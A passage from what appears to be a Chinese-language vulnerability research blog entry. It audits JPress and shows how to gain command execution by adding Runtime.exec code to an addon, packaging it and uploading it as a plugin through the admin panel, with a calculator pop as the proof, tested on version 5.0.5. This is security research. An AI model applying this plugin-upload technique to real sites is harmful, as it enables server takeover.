alt="image-20221227154325574"></p><p>展开项目，我们修改jpress-addon-helloworld子项目，可以看到HelloWorldAddon这个文件负责：安装、卸载、启动、停止时触发的动作，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227154904932.png" alt="image-20221227154904932"></p><p>HelloWorldAddonController这个文件负责访问某些路径时触发的动作，我们选择在方法adminmenutest()中添加如下恶意代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加后如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227155336903.png" alt="image-20221227155336903"></p><p>然后我们将项目jpress-addon-helloworld打包成jar包，我这边进入jpress-addon-helloworld子目录后执行mvn clean package会打包失败，需要进入根目录执行mvn clean package，执行后如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227155830016.png" alt="image-20221227155830016"></p><p>然后在jpress-addon-helloworld的target目录下找到jpress-addon-helloworld-4.0.jar，登录后台，在插件处上传jpress-addon-helloworld-4.0.jar，然后点击插件测试，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227160221062.png" alt="image-20221227160221062"></p><p>可以看到成功弹出计算器</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227160017106.png" alt="image-20221227160017106"></p><p>同样的方式，我们测试下，在最新版（截止到2022/12/27，最新版为5.0.5）中，此方法是否可以getshell，同样的过程搭建一下jpress最新版，搭建好后进入后台，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227170402762.png" alt="image-20221227170402762"></p><p>上传刚才打包好的jar包，点击插件测试，看到可成功执行命令，弹出计算器</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227170736878.png" alt="image-20221227170736878"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-目标熟悉&quot;&gt;&lt;a href=&quot;#0x01-目标熟悉&quot; class=&quot;headerlink&quot; title=&quot;0x01 目标熟悉&quot;&gt;&lt;/a&gt;0x01 目标熟悉&lt;/h1&gt;&lt;p&gt;JPress 是一个使用 Java 开发的、开源免费的建站神器，灵感来源于 Word</summary>
      
    
    
    
    <category term="漏洞研究" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="JAVA" scheme="http://example.com/tags/JAVA/"/>
    
  </entry>
  
</feed>
